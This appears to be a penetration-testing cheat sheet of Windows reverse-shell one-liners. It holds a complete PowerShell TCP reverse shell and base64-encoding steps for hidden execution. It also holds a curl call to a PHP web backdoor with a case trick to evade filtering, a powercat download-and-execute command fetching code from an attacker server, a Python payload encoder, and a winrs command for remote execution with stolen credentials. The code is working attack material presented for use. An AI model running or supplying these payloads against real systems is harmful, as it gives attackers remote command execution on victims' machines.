# REVERSE SHELL
#powershell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("[atacker ip]",[attacker listening port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


base64 encode

$text = '[commands here]'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                                                                                                                                                                                                         $EncodedText =[Convert]::ToBase64String($Bytes)                                                                                                                                                                                                                 $EncodedText


curl http://[ip]/[some]/[location]/simple-backdoor.pHP?cmd=powershell%20-enc%20[base 64 encoded string]

pHP to bypass case sensitive prevention
```

#powercat
```powershell
powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('http://[attacker ip]:[attacker http port]/powercat.ps1');powercat -c [attacker ip] -p [attacker listener port] -e powershell"
```

#python_helper 
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("[attacker ip]",[attacker listening port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

#winrs 
```
winrs -r:[remote host] -u:[user] -p:[password]  "powershell -nop -w hidden -e [encoded payload]"
```